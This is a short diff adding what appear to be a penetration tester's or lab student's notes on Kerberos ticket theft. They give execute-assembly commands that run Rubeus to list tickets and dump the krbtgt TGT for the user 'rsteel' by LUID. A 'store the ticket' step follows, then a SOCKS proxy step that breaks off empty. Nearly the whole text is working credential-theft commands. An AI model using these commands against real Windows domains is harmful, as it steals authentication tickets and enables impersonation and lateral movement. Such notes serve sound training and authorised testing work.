@@ -1,0 +1,7 @@
+dump the TGT for desired user (rsteel):
+    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+    grab the LUID for rsteel/krbtgt (0x1e8e46)
+    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x1e8e46 /service:krbtgt /nowrap
+    store the ticket!
+start a socks proxy:
+    
